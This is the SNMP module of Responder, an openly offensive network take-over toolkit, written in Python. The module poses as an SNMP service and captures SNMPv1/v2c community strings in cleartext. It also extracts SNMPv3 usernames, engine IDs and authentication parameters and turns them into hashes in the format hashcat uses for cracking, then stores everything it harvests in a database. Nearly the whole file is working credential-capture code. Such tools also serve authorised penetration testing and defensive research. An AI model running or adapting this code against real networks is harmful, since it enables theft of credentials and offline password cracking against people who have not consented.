#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: lgaffie@secorizon.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from utils import *
from binascii import hexlify, unhexlify
import struct

try:
    from pyasn1.codec.ber.decoder import decode
    from pyasn1.codec.ber.encoder import encode
    HAS_PYASN1 = True
except ImportError:
    HAS_PYASN1 = False
    if settings.Config.Verbose:
        print(text('[SNMP] Warning: pyasn1 not installed, SNMP server disabled'))

if settings.Config.PY2OR3 == "PY3":
    from socketserver import BaseRequestHandler
else:
    from SocketServer import BaseRequestHandler

# SNMPv3 Authentication Algorithms
SNMPV3_AUTH_ALGORITHMS = {
    b'\x06\x0c\x2b\x06\x01\x06\x03\x0f\x01\x01\x04\x00': ('usmNoAuthProtocol', None),
    b'\x06\x0a\x2b\x06\x01\x06\x03\x0a\x01\x01\x02': ('usmHMACMD5AuthProtocol', 25100),
    b'\x06\x0a\x2b\x06\x01\x06\x03\x0a\x01\x01\x03': ('usmHMACSHAAuthProtocol', 25200),
    b'\x06\x09\x2b\x06\x01\x06\x03\x0a\x01\x01\x04': ('usmHMAC128SHA224AuthProtocol', 25300),
    b'\x06\x09\x2b\x06\x01\x06\x03\x0a\x01\x01\x05': ('usmHMAC192SHA256AuthProtocol', 25400),
    b'\x06\x09\x2b\x06\x01\x06\x03\x0a\x01\x01\x06': ('usmHMAC256SHA384AuthProtocol', 25500),
    b'\x06\x09\x2b\x06\x01\x06\x03\x0a\x01\x01\x07': ('usmHMAC384SHA512AuthProtocol', 25600),
}

class SNMP(BaseRequestHandler):
    def handle(self):
        if not HAS_PYASN1:
            return
        
        try:
            data = self.request[0]
            socket = self.request[1]
            
            if settings.Config.Verbose:
                print(text('[SNMP] Received %d bytes from %s' % (len(data), self.client_address[0])))
            
            # Decode the SNMP message
            try:
                received_record, rest_of_substrate = decode(data)
            except Exception as e:
                if settings.Config.Verbose:
                    print(text('[SNMP] ASN.1 decode error: %s' % str(e)))
                return
            
            # Get SNMP version
            try:
                snmp_version = int(received_record['field-0'])
            except:
                if settings.Config.Verbose:
                    print(text('[SNMP] Could not determine SNMP version'))
                return
            
            if settings.Config.Verbose:
                print(text('[SNMP] SNMP version: %s' % ('v3' if snmp_version == 3 else 'v2c' if snmp_version == 1 else 'v1')))
            
            # Handle SNMPv3
            if snmp_version == 3:
                self.handle_snmpv3(data, received_record, socket)
            # Handle SNMPv1/v2c
            else:
                self.handle_snmpv1v2c(data, received_record, snmp_version, socket)
        
        except Exception as e:
            if settings.Config.Verbose:
                print(text('[SNMP] Exception in handler: %s' % str(e)))
            pass
    
    def handle_snmpv3(self, data, received_record, socket):
        """Handle SNMPv3 messages and extract authentication parameters"""
        try:
            # Get the full message in hex for hashcat
            full_snmp_msg = hexlify(data).decode('utf-8')
            
            # Decode the inner security parameters
            received_record_inner, _ = decode(received_record['field-2'])
            
            # Extract fields
            snmp_user = str(received_record_inner['field-3'])
            engine_id = hexlify(received_record_inner['field-0']._value).decode('utf-8')
            engine_boots = int(received_record_inner['field-1'])
            engine_time = int(received_record_inner['field-2'])
            auth_params = hexlify(received_record_inner['field-4']._value).decode('utf-8')
            priv_params = hexlify(received_record_inner['field-5']._value).decode('utf-8')
            
            if settings.Config.Verbose:
                print(text('[SNMP] SNMPv3 User: %s' % snmp_user))
                print(text('[SNMP] Engine ID: %s' % engine_id))
                print(text('[SNMP] Engine Boots: %d' % engine_boots))
                print(text('[SNMP] Engine Time: %d' % engine_time))
                print(text('[SNMP] Auth Params: %s' % auth_params))
                print(text('[SNMP] Priv Params: %s' % priv_params))
            
            # Determine authentication algorithm
            auth_algo_name, hashcat_mode = self.identify_auth_algorithm(data)
            
            if settings.Config.Verbose:
                if auth_algo_name:
                    print(text('[SNMP] Auth Algorithm: %s (hashcat mode %s)' % (auth_algo_name, hashcat_mode)))
                else:
                    print(text('[SNMP] Auth Algorithm: Unknown'))
            
            # Check if authentication is actually being used
            if not auth_params or auth_params == '00' * 12:
                if settings.Config.Verbose:
                    print(text('[SNMP] No authentication parameters (noAuth)'))
                
                # Still save the username with noAuth indicator
                SaveToDb({
                    "module": "SNMP",
                    "type": "SNMPv3-noAuth",
                    "client": self.client_address[0],
                    "user": snmp_user,
                    "cleartext": "(noAuth)",
                    "fullhash": snmp_user + ":(noAuth)"
                })
                return
            
            # Build hashcat-compatible hash
            if hashcat_mode:
                # Hashcat format for SNMPv3:
                # $SNMPv3$<auth_type>$<engine_id>$<engine_boots>$<engine_time>$<username>$<auth_params>$<packet>
                
                # Auth type for hashcat (0=MD5, 1=SHA1, 2=SHA224, 3=SHA256, 4=SHA384, 5=SHA512)
                auth_type_map = {
                    25100: 0,  # MD5
                    25200: 1,  # SHA1
                    25300: 2,  # SHA224
                    25400: 3,  # SHA256
                    25500: 4,  # SHA384
                    25600: 5,  # SHA512
                }
                auth_type = auth_type_map.get(hashcat_mode, 0)
                
                # Build the hash
                hashcat_hash = "$SNMPv3$%d$%s$%d$%d$%s$%s$%s" % (
                    auth_type,
                    engine_id,
                    engine_boots,
                    engine_time,
                    snmp_user,
                    auth_params,
                    full_snmp_msg
                )
                
                if settings.Config.Verbose:
                    print(text('[SNMP] Built hashcat hash (mode %d)' % hashcat_mode))
                
                SaveToDb({
                    "module": "SNMP",
                    "type": "SNMPv3-%s" % auth_algo_name,
                    "client": self.client_address[0],
                    "user": snmp_user,
                    "hash": hashcat_hash,
                    "fullhash": hashcat_hash
                })
            else:
                # Unknown algorithm or no auth - save basic info
                SaveToDb({
                    "module": "SNMP",
                    "type": "SNMPv3",
                    "client": self.client_address[0],
                    "user": snmp_user,
                    "hash": auth_params,
                    "fullhash": "{}:{}:{}:{}".format(snmp_user, full_snmp_msg, engine_id, auth_params)
                })
            
            # Send a response (Report PDU indicating authentication failure)
            # This keeps the conversation going
            self.send_snmpv3_report(socket)
            
        except Exception as e:
            if settings.Config.Verbose:
                print(text('[SNMP] SNMPv3 parsing error: %s' % str(e)))
            pass
    
    def handle_snmpv1v2c(self, data, received_record, snmp_version, socket):
        """Handle SNMPv1/v2c messages and extract community strings"""
        try:
            community_string = str(received_record['field-1'])
            version_str = 'v1' if snmp_version == 0 else 'v2c'
            
            if settings.Config.Verbose:
                print(text('[SNMP] %s Community String: %s' % (version_str, community_string)))
            
            # Validate community string (should be printable)
            if not community_string or not self.is_printable(community_string):
                if settings.Config.Verbose:
                    print(text('[SNMP] Invalid community string (non-printable or empty)'))
                return
            
            SaveToDb({
                "module": "SNMP",
                "type": "Cleartext SNMP%s" % version_str,
                "client": self.client_address[0],
                "user": community_string,
                "cleartext": community_string,
                "fullhash": community_string,
            })
            
            # Send a response (could be a proper SNMP response or error)
            # For now, we just close the connection
            
        except Exception as e:
            if settings.Config.Verbose:
                print(text('[SNMP] SNMPv1/v2c parsing error: %s' % str(e)))
            pass
    
    def identify_auth_algorithm(self, data):
        """
        Identify the authentication algorithm used in SNMPv3
        Returns (algorithm_name, hashcat_mode)
        """
        try:
            # Look for OID patterns in the raw data
            for oid_bytes, (algo_name, hashcat_mode) in SNMPV3_AUTH_ALGORITHMS.items():
                if oid_bytes in data:
                    return (algo_name, hashcat_mode)
            
            # If not found by OID, try to infer from auth params length
            # MD5: 12 bytes, SHA1: 12 bytes, SHA224: 16 bytes, SHA256: 24 bytes, SHA384: 32 bytes, SHA512: 48 bytes
            # Note: This is less reliable
            
            return (None, None)
        except:
            return (None, None)
    
    def is_printable(self, s):
        """Check if string contains only printable characters"""
        try:
            return all(32 <= ord(c) <= 126 for c in s)
        except:
            return False
    
    def send_snmpv3_report(self, socket):
        """
        Send a minimal SNMPv3 Report PDU
        This indicates authentication failure but keeps the conversation alive
        """
        try:
            # Minimal Report PDU - just close for now
            # A proper implementation would build a valid SNMP Report PDU
            pass
        except:
            pass
